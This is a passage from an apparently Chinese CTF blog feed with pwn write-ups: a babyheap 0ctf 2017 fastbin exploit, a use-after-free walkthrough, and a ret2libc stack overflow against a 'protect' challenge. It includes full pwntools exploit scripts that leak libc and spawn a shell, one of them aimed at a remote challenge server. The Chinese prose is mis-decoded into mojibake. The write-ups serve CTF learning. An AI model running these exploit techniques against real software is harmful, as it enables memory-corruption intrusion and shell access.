0x7f,  bk_nextsize = 0x0&#125;</code></p><p>è®¡ç®—åç§»</p><p><code>p/x main_arena_addr - fake_chunks_addr</code></p></blockquote><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202193142303.png" class="" title="image-20200202193142303"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#5</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br>allocate(<span class="hljs-number">0x10</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>sh = process(<span class="hljs-string">&#x27;./babyheap_0ctf_2017&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">idx,content</span>):</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>sh.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>sh.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>sh.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">idx</span>):</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#00x00</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#10x20</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#20x40</span><br>allocate(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#30x60</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x60</span>)fill(<span class="hljs-number">0</span>,payload)<br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">1</span>,payload)<br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">1</span>,payload)<br>allocate(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">3</span>)<br>dump(<span class="hljs-number">2</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br>main_arena = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span><br>log.success(<span class="hljs-string">&#x27;main arena: &#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena))<br>libc_base = main_arena - <span class="hljs-number">0x3c4b20</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>one_gadget = libc_base + <span class="hljs-number">0x4526a</span> <span class="hljs-comment"># 0x4526a 0xf02a4 0xf1147 0x45216</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>free(<span class="hljs-number">3</span>)<br>fake_chunk_addr = main_arena - <span class="hljs-number">0x33</span><br>payload = p64(fake_chunk_addr)<br>fill(<span class="hljs-number">2</span>,payload)<br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#5</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br>allocate(<span class="hljs-number">0x10</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å †ä¹‹UAF(Use_after_free)åŠè°ƒè¯•-hitcontraining_uaf</title>
    <link href="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/"/>
    <url>/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://wiki.x10sec.org/pwn/heap/use_after_free/">https://wiki.x10sec.org/pwn/heap/use_after_free/</a></p><p><strong>ä¸€ä¸ªå¾ˆç›´æ¥çš„æƒ³æ³•æ˜¯ä¿®æ”¹noteçš„putå­—æ®µä¸ºmagicå‡½æ•°çš„åœ°å€ï¼Œä»è€Œå®ç°åœ¨æ‰§è¡Œprint note çš„æ—¶å€™æ‰§è¡Œmagicå‡½æ•°ã€‚</strong> é‚£ä¹ˆè¯¥æ€ä¹ˆæ‰§è¡Œå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥ç®€å•æ¥çœ‹ä¸€ä¸‹æ¯ä¸€ä¸ªnoteç”Ÿæˆçš„å…·ä½“æµç¨‹</p><ol><li><p>ç¨‹åºç”³è¯·8å­—èŠ‚å†…å­˜ç”¨æ¥å­˜æ”¾noteä¸­çš„putä»¥åŠcontentæŒ‡é’ˆã€‚</p></li><li><p>ç¨‹åºæ ¹æ®è¾“å…¥çš„sizeæ¥ç”³è¯·æŒ‡å®šå¤§å°çš„å†…å­˜ï¼Œç„¶åç”¨æ¥å­˜å‚¨contentã€‚</p></li></ol>   <figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+-----------------+                       <br>|<span class="hljs-string">   put           </span>|<span class="hljs-string">                       </span><br><span class="hljs-string">+-----------------+                       </span><br>|<span class="hljs-string">   content       </span>|<span class="hljs-string">       size              </span><br><span class="hljs-string">+-----------------+-------------------&gt;+----------------+</span><br><span class="hljs-string">                                       </span>|<span class="hljs-string">     real       </span>|<br>                                       |<span class="hljs-string">    content     </span>|<br>                                       |<span class="hljs-string">                </span>|<br>                                       +----------------+<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œæ ¹æ®æˆ‘ä»¬ä¹‹å‰åœ¨å †çš„å®ç°ä¸­æ‰€å­¦åˆ°çš„ï¼Œæ˜¾ç„¶noteæ˜¯ä¸€ä¸ªfastbin chunkï¼ˆå¤§å°ä¸º16å­—èŠ‚ï¼‰ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯å¸Œæœ›ä¸€ä¸ªnoteçš„putå­—æ®µä¸ºmagicçš„å‡½æ•°åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¿…é¡»æƒ³åŠæ³•è®©æŸä¸ªnoteçš„putæŒ‡é’ˆè¢«è¦†ç›–ä¸ºmagicåœ°å€ã€‚ç”±äºç¨‹åºä¸­åªæœ‰å”¯ä¸€çš„åœ°æ–¹å¯¹putè¿›è¡Œèµ‹å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬å¿…é¡»åˆ©ç”¨å†™real contentçš„æ—¶å€™æ¥è¿›è¡Œè¦†ç›–ã€‚å…·ä½“é‡‡ç”¨çš„æ€è·¯å¦‚ä¸‹</p><ul><li>ç”³è¯·note0ï¼Œreal content sizeä¸º16ï¼ˆå¤§å°ä¸noteå¤§å°æ‰€åœ¨çš„binä¸ä¸€æ ·å³å¯ï¼‰</li><li>ç”³è¯·note1ï¼Œreal content sizeä¸º16ï¼ˆå¤§å°ä¸noteå¤§å°æ‰€åœ¨çš„binä¸ä¸€æ ·å³å¯ï¼‰</li><li>é‡Šæ”¾note0</li><li>é‡Šæ”¾note1</li><li>æ­¤æ—¶ï¼Œå¤§å°ä¸º16çš„fast bin chunkä¸­é“¾è¡¨ä¸ºnote1-&gt;note0</li><li>ç”³è¯·note2ï¼Œå¹¶ä¸”è®¾ç½®real contentçš„å¤§å°ä¸º8ï¼Œé‚£ä¹ˆæ ¹æ®å †çš„åˆ†é…è§„åˆ™</li><li>note2å…¶å®ä¼šåˆ†é…note1å¯¹åº”çš„å†…å­˜å—ã€‚</li><li>real content å¯¹åº”çš„chunkå…¶å®æ˜¯note0ã€‚</li><li>å¦‚æœæˆ‘ä»¬è¿™æ—¶å€™å‘note3çš„chunkéƒ¨åˆ†å†™å…¥magicçš„åœ°å€ï¼Œé‚£ä¹ˆç”±äºæˆ‘ä»¬æ²¡æœ‰note1ä¸ºNULLã€‚å½“æˆ‘ä»¬å†æ¬¡å°è¯•è¾“å‡ºnote1çš„æ—¶å€™ï¼Œç¨‹åºå°±ä¼šè°ƒç”¨magicå‡½æ•°ã€‚</li></ul></blockquote><h2 id="ç¨‹åº"><a href="#ç¨‹åº" class="headerlink" title="ç¨‹åº"></a>ç¨‹åº</h2><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201220702851.png" class="" title="image-20200201220702851"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221032403.png" class="" title="image-20200201221032403"><p>freeäº†ä½†æ²¡æœ‰è®¾ç½®ä¸º0ï¼Œæ‰€ä»¥å­˜åœ¨uaf</p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221102009.png" class="" title="image-20200201221102009"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221149782.png" class="" title="image-20200201221149782"><p>åœ¨è¿™é‡Œï¼Œ<code>notelist[i][0]</code>å­˜æ”¾çš„æ˜¯putså‡½æ•°çš„åœ°å€ï¼Œ<code>notelist[i][1]</code>å­˜æ”¾çš„å°±æ˜¯æŒ‡å‘contentçš„åœ°å€</p><p>å…ˆç”³è¯·ä¸¤ä¸ª0x10çš„ç©ºé—´ï¼Œå†…å®¹ä¸ºaaaa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201220613982.png" class="" title="image-20200201220613982"><p>æœ€ä¸‹é¢çš„æ˜¯top chunkï¼Œæˆ‘ä»¬ç”³è¯·äº†çš„ä¸¤å—0x10ç©ºé—´ï¼Œè¿˜æœ‰ä¸¤å—æ˜¯å› ä¸ºä¸‹å›¾ï¼Œå¹¶ä¸”ï¼Œå †å—åœ°å€å‘ä¸Šç”Ÿé•¿</p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221459981.png" class="" title="image-20200201221459981"><p>æ‰€ä»¥ï¼Œæœ€å…ˆçš„<code>0x826300</code>å’Œ<code>0x826328</code>åº”è¯¥å°±æ˜¯æœ€å…ˆåˆ†é…çš„notelist[i]ï¼Œé‡Œé¢å­˜æ”¾ç€æŒ‡å‘print_note_contentçš„åœ°å€ï¼Œ<code>0x826310</code>å’Œ<code>0x826338</code>å°±æ˜¯æˆ‘ä»¬è‡ªå·±ç”³è¯·çš„å †äº†</p><p>ç„¶ååœ¨æˆ‘ä»¬deleteäº†è¿™ä¸¤ä¸ªå †å—ä¹‹åï¼Œï¼ˆç”±äºé‡æ–°è¿è¡Œç¨‹åºæ‰€ä»¥åœ°å€æ”¹å˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201224306213.png" class="" title="image-20200201224306213"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201224344952.png" class="" title="image-20200201224344952"><p><code>0x902e010</code>ï¼ˆæˆ‘ä»¬ç”³è¯·çš„ï¼‰å’Œ<code>0x902e00</code>ï¼ˆå­˜æ”¾putsåœ°å€çš„ï¼‰å…ˆè¿›å…¥fastbinså•é“¾è¡¨</p><p>ç„¶åæ­¤æ—¶æˆ‘ä»¬å†<code>add(8,p32(shell))</code></p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201225157906.png" class="" title="image-20200201225157906"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201225221156.png" class="" title="image-20200201225221156"><p><code>0x87d0028</code>å…ˆå‡ºæ¥ï¼Œå‚¨å­˜printåœ°å€ï¼Œç„¶åå†<code>0x87d0000</code>,å‚¨å­˜magicåœ°å€</p><p>æœ€åï¼Œæˆ‘ä»¬å†print heap0æ—¶ï¼Œå°±è·³è½¬åˆ°äº†magicåœ°å€ä¸Šé¢å»äº†</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BrainOverFlow_Vol.1_BUUç‰¹ä¾›</title>
    <link href="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/"/>
    <url>/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/</url>
    
    <content type="html"><![CDATA[<p>å¾ˆæœ‰æ„æ€ï¼ˆå¥½ç©ï¼‰çš„æ¸¸æˆï¼Œæ„Ÿè°¢æœ­å“¥çš„é¢˜</p><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195435399.png" class="" title="image-20200130195435399"><p>btwï¼Œæˆ‘ä¹Ÿæ²¡æƒ³åˆ°æˆ‘ä¼šæ˜¯ç¬¬å…­ä¸ªè§£å‡ºæ¥çš„hhhhhï¼Œæˆ‘å¯ä»¥å¹ä¸€ä¸ªæœˆï¼ˆç¬‘</p><p>å‰§æƒ…æˆ‘å°±ä¸è¯´äº†ï¼Œåæ­£å¾ˆæœ‰æ„æ€çš„</p><p>å…·ä½“ä¸œè¥¿éƒ½è—åœ¨/www/dataé‡Œè¾¹ï¼Œæ¯ä¸€æ¬¡çš„åœ°å›¾æ•°æ®ï¼ˆä¸»è¦åœ¨Map013ï¼Œ15ï¼Œ22ï¼‰éƒ½æœ‰ï¼Œä¸ªäººç­‰çº§ï¼Œå§“åï¼Œæ­¦å™¨å”®å–ä»·å€¼ç­‰éƒ½å¯ä»¥æ”¹hhhhh</p><p>äºæˆ‘ä¸‰å°æ—¶æ‰“é€šæ¸¸æˆï¼Œåšäº†åŠå¤©pwnä»¥ä¸ºæ˜¯ç›²æ‰“ï¼Œç„¶åå‘ç°äº†æ–‡ä»¶å°±åœ¨å›¾ç‰‡æ—è¾¹orz</p><h2 id="protect"><a href="#protect" class="headerlink" title="protect"></a>protect</h2><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130200100596.png" class="" title="image-20200130200100596"><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195934944.png" class="" title="image-20200130195934944"><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195944896.png" class="" title="image-20200130195944896"><p>è¿™å›¾å°±æ˜¯æº¢å‡ºç‚¹ï¼Œbufç©ºé—´åªæœ‰0x40ï¼Œä½†æ˜¯å´è¯»å…¥0xC8ä¸ªï¼Œé¢˜ç›®æ²¡æœ‰systemå’Œ/bin/shå­—æ®µï¼Œå°±æ˜¯ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./protect&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./protect&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;options&quot;</span>)<br>    sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;Password.&quot;</span>)<br>    pop_rdi = <span class="hljs-number">0x0000000000400a43</span> <span class="hljs-comment"># é€šè¿‡ROPgadgetè·å¾—</span><br>    payload = cyclic(<span class="hljs-number">0x40</span> + <span class="hljs-number">8</span>)<br>    payload += p64(pop_rdi)<br>    payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    payload += p64(<span class="hljs-number">0x40094B</span>)<br>    <span class="hljs-comment">#pause()</span><br>    sh.sendline(payload)<br>    __libc_start_main = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br>    log.success(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br>    sh.recvuntil(<span class="hljs-string">&quot;options&quot;</span>)<br>    sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;Password.&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0x40</span> + <span class="hljs-number">8</span>)<br>    payload += p64(pop_rdi)<br>    payload += p64(binsh)<br>    payload += p64(system)<br>    <span class="hljs-comment">#pause()</span><br>    sh.sendline(payload)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;123.206.21.178&quot;</span>,<span class="hljs-number">10000</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><blockquote><p><a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#_9">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#_9</a></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å¾—åˆ° system å‡½æ•°çš„åœ°å€å‘¢ï¼Ÿè¿™é‡Œå°±ä¸»è¦åˆ©ç”¨äº†ä¸¤ä¸ªçŸ¥è¯†ç‚¹</p><ul><li>system å‡½æ•°å±äº libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚</li><li>å³ä½¿ç¨‹åºæœ‰ ASLR ä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„12ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚è€Œ libc åœ¨githubä¸Šæœ‰äººè¿›è¡Œæ”¶é›†ï¼Œå¦‚ä¸‹</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬çŸ¥é“ libc ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šè¯¥ç¨‹åºåˆ©ç”¨çš„ libcã€‚è¿›è€Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ systemå‡½æ•°çš„åœ°å€ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•å¾—åˆ° libc ä¸­çš„æŸä¸ªå‡½æ•°çš„åœ°å€å‘¢ï¼Ÿæˆ‘ä»¬ä¸€èˆ¬å¸¸ç”¨çš„æ–¹æ³•æ˜¯é‡‡ç”¨ got è¡¨æ³„éœ²ï¼Œå³è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹ã€‚<strong>å½“ç„¶ï¼Œç”±äº libc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€ã€‚</strong></p><p>æˆ‘ä»¬è‡ªç„¶å¯ä»¥æ ¹æ®ä¸Šé¢çš„æ­¥éª¤å…ˆå¾—åˆ° libcï¼Œä¹‹ååœ¨ç¨‹åºä¸­æŸ¥è¯¢åç§»ï¼Œç„¶åå†æ¬¡è·å– system åœ°å€ï¼Œä½†è¿™æ ·æ‰‹å·¥æ“ä½œæ¬¡æ•°å¤ªå¤šï¼Œæœ‰ç‚¹éº»çƒ¦ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ª libc çš„åˆ©ç”¨å·¥å…·ï¼Œå…·ä½“ç»†èŠ‚è¯·å‚è€ƒ readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><p>æ­¤å¤–ï¼Œåœ¨å¾—åˆ° libc ä¹‹åï¼Œå…¶å® libc ä¸­ä¹Ÿæ˜¯æœ‰ /bin/sh å­—ç¬¦ä¸²çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸€èµ·è·å¾— /bin/sh å­—ç¬¦ä¸²çš„åœ°å€ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬æ³„éœ² __libc_start_main çš„åœ°å€ï¼Œè¿™æ˜¯å› ä¸ºå®ƒæ˜¯ç¨‹åºæœ€åˆè¢«æ‰§è¡Œçš„åœ°æ–¹ã€‚åŸºæœ¬åˆ©ç”¨æ€è·¯å¦‚ä¸‹</p><ul><li>æ³„éœ² __libc_start_main åœ°å€</li><li>è·å– libc ç‰ˆæœ¬</li><li>è·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€</li><li>å†æ¬¡æ‰§è¡Œæºç¨‹åº</li><li>è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn_by_examples</title>
